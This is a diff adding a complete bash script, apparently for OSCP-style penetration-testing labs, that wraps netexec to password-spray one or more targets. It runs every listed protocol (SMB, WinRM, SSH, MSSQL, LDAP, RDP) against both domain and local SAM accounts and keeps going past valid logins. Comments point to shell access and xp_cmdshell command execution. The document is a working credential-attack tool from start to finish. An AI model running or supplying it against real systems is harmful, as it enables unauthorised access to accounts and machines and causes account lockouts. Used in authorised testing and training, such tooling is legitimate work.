@@ -1,0 +1,116 @@
+#!/bin/bash
+
+# Usage:
+#   nxcspray <protocols|all> <targets> -u <username> -p <password>
+#
+# Examples:
+#   nxcspray all 10.10.10.10 -u bob -p password
+#   nxcspray smb,ldap,winrm hosts.txt -u bob -p password
+#   nxcspray all "10.10.10.10 10.10.10.11" -u bob -p password
+#
+# Tests EVERY protocol against BOTH domain accounts and local (SAM) accounts,
+# and keeps going after a hit instead of stopping at the first valid login.
+
+# ---- Usage ----
+usage() {
+    cat <<EOF
+Usage: $0 <protocols|all> <targets> -u <username> -p <password>
+
+    <protocols|all>   Comma-separated list of protocols, or "all"
+                       Supported: smb,winrm,ssh,mssql,ldap,rdp
+
+    <targets>          Single IP, space-separated IPs (quoted), or a file (one IP per line)
+
+    -u <username>      Username, or a file of usernames
+    -p <password>      Password, or a file of passwords
+
+Examples:
+    $0 all 10.10.10.10 -u bob -p password
+    $0 smb,ldap,winrm hosts.txt -u bob -p password
+    $0 all "10.10.10.10 10.10.10.11" -u bob -p password
+    $0 all targets.txt -u users.txt -p passwords.txt
+
+Notes:
+    - Every protocol is sprayed against BOTH domain accounts and local (SAM) accounts.
+    - --continue-on-success is always used, so it won't stop at the first valid login.
+EOF
+}
+
+# ---- Argument Validation ----
+if [ "$#" -lt 4 ]; then
+    usage
+    exit 1
+fi
+
+PROTOS_RAW="$1"
+TARGETS_RAW="$2"
+shift 2
+
+USER=""
+PASS=""
+
+while getopts "u:p:" opt; do
+    case $opt in
+        u) USER="$OPTARG" ;;
+        p) PASS="$OPTARG" ;;
+        *)
+            echo "[-] Invalid flag"
+            exit 1
+            ;;
+    esac
+done
+
+if [ -z "$USER" ] || [ -z "$PASS" ]; then
+    echo "[-] Missing required flags: -u <username> -p <password>"
+    exit 1
+fi
+
+# ---- Protocol Handling ----
+# Ordered roughly by likelihood of a quick win / useful signal in OSCP-style labs:
+#   smb    -> fastest, most commonly open, null/guest sessions, share access
+#   winrm  -> direct shell access if creds are valid (Pwn3d!)
+#   ssh    -> direct shell access on *nix boxes
+#   mssql  -> can lead to xp_cmdshell / command exec
+#   ldap   -> validates domain creds, useful recon even without a shell
+#   rdp    -> slow, GUI-only, higher lockout risk, test last
+if [ "$PROTOS_RAW" = "all" ]; then
+    PROTO_ARRAY=(smb winrm ssh mssql ldap rdp)
+else
+    IFS=',' read -ra PROTO_ARRAY <<< "$PROTOS_RAW"
+fi
+
+# ---- Target Handling ----
+# Supports: a single IP, space-separated IPs (quoted), or a file of IPs (one per line)
+if [ -f "$TARGETS_RAW" ]; then
+    TARGETS=$(cat "$TARGETS_RAW")
+else
+    TARGETS="$TARGETS_RAW"
+fi
+
+# ---- Colors ----
+# Chosen to avoid netexec's own palette (green=success, red=fail, orange=Pwn3d!, blue=protocol)
+MAGENTA='\033[1;35m'  # domain
+CYAN='\033[1;36m'     # local
+RESET='\033[0m'
+
+# ---- Auth Mode Handling ----
+# "" tests domain accounts, "--local-auth" tests local SAM accounts
+AUTH_MODES=("" "--local-auth")
+AUTH_LABELS=("domain" "local")
+AUTH_COLORS=("$MAGENTA" "$CYAN")
+
+# ---- Spray Loop ----
+for PROTO in "${PROTO_ARRAY[@]}"; do
+    for i in "${!AUTH_MODES[@]}"; do
+        MODE="${AUTH_MODES[$i]}"
+        LABEL="${AUTH_LABELS[$i]}"
+        COLOR="${AUTH_COLORS[$i]}"
+
+        echo -e "${COLOR}[+] Spraying protocol: $PROTO  (auth: ${LABEL})${RESET}"
+
+        for TARGET in $TARGETS; do
+            echo "    -> Target: $TARGET"
+            nxc "$PROTO" "$TARGET" -u "$USER" -p "$PASS" --continue-on-success $MODE
+        done
+    done
+done
